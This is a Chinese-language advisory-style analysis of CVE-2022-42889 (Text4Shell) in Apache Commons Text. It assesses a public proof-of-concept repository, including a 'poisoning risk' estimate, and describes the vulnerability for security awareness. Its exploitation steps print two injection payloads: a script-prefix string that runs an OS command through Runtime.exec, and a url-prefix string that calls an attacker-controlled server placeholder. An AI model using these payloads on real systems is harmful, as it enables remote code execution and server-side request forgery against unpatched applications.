## CVE-2022-42889-Apache Commons Text-RCE/SSRF

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE) / 服务器端请求伪造 (SSRF)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行或服务器端请求伪造

**影响版本:** < 1.10.0 (1.5 <= version <= 1.9)

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户可控输入被用于文本插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text 1.5到1.9版本中的一个严重漏洞。该漏洞允许攻击者通过构造包含恶意表达式的字符串，利用文本插值功能执行任意代码（RCE）或发起服务器端请求伪造（SSRF）攻击。

**有效性分析：**

提供的POC代码是一个Python脚本，旨在测试目标系统是否存在Text4Shell漏洞。该脚本支持两种模式：

*   **RCE模式：** 利用`script`前缀，尝试执行JavaScript命令。具体而言，它使用Nashorn引擎（在Java 15及更高版本中默认禁用）来执行操作系统命令。如果目标系统启用了Nashorn引擎，则可能成功执行RCE攻击。
*   **SSRF模式：** 利用`url`前缀，尝试从指定的URL获取内容。这可能导致服务器向攻击者控制的服务器发出请求，从而泄露敏感信息或进行其他攻击。

根据NVD信息和搜索引擎结果，该漏洞影响Apache Commons Text 1.5到1.9版本，利用的关键在于应用程序是否接受用户可控的输入并将其传递给`StringSubstitutor.replace()`等插值方法。

因此，该POC代码在特定条件下是有效的。如果目标系统使用了受影响的Apache Commons Text版本，并且允许用户输入参与文本插值，那么攻击者就可以利用该漏洞。

**投毒风险分析：**

对提供的POC代码进行分析，可以发现其中存在轻微的投毒风险。虽然脚本本身的功能是测试漏洞，但如果攻击者修改脚本，例如：

*   **修改RCE命令：** 将测试命令替换为恶意命令，例如下载并执行恶意程序。
*   **修改SSRF URL：** 将SSRF目标URL替换为指向包含恶意内容的URL，例如包含恶意JavaScript代码的页面。
*   **增加额外功能** 添加未经授权的信息收集功能。

这些修改可能会导致用户在不知情的情况下受到攻击。

因此，评估的投毒风险为5%。主要集中在使用人员的安全意识上，是否存在下载后未进行代码审核直接执行的情况。

**利用方式：**

1.  **确定目标系统使用的Apache Commons Text版本是否在受影响范围内 (1.5-1.9)。**
2.  **找到应用程序中接受用户输入并使用Apache Commons Text进行文本插值的位置。**
3.  **构造包含恶意表达式的字符串，例如：**
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('malicious_command')}` (RCE，需要Nashorn引擎支持)
    *   `${url:UTF-8:http://attacker_controlled_server/resource}` (SSRF)
4.  **将构造的恶意字符串作为用户输入传递给应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或发起SSRF攻击。**

**项目地址:** [808ale/CVE-2022-42889-Text4Shell-POC](https://github.com/808ale/CVE-2022-42889-Text4Shell-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)